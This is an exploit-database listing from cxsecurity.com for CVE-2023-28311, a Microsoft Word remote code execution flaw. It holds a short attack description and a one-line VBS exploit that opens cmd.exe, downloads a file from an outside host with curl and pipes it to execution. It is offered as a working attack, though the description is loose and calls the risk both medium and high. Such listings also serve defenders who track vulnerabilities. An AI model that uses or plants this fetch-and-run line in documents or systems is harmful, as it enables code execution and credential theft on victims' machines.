---
title: Microsoft Word Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040060
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-16
fetch_date: 2025-10-04T11:31:45.753219
---

# Microsoft Word Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Word Remote Code Execution** **2023.04.15**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-28311](https://cxsecurity.com/cveshow/CVE-2023-28311/ "Click to see CVE-2023-28311")**  CWE: **N/A** | |

## Title: Microsoft Word Remote Code Execution Vulnerability
## Author: nu11secur1ty
## Date: 04.14.2023
## Vendor: https://www.microsoft.com/
## Software:
https://www.microsoft.com/en-us/microsoft-365/word?activetab=tabs%3afaqheaderregion3
## Reference:
https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/
## CVE-2023-28311
## Description:
The attack itself is carried out locally by a user with authentication to
the targeted system. An attacker could exploit the vulnerability by
convincing a victim, through social engineering, to download and open a
specially crafted file from a website which could lead to a local attack on
the victim's computer. The attacker can trick the victim to open a
malicious web page by using a `Word` malicious file and he can steal
credentials, bank accounts information, sniffing and tracking all the
traffic of the victim without stopping - it depends on the scenario and etc.
STATUS: HIGH Vulnerability
[+]Exploit:
The exploit server must be BROADCASTING at the moment when the victim hit
the button of the exploit!
```vbs
Call Shell("cmd.exe /S /c" & "curl -s
http://tarator.com/ChushkI/ebanie.tarator | tarator", vbNormalFocus)
```
## Reproduce:
[href](
https://github.com/nu11secur1ty/CVE-mitre/tree/main/2023/CVE-2023-28311)
## Reference:
[href](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28311)
[href](
https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/)
## Proof and Exploit
[href](https://streamable.com/s60x3k)
## Time spend:
01:00:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040060)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top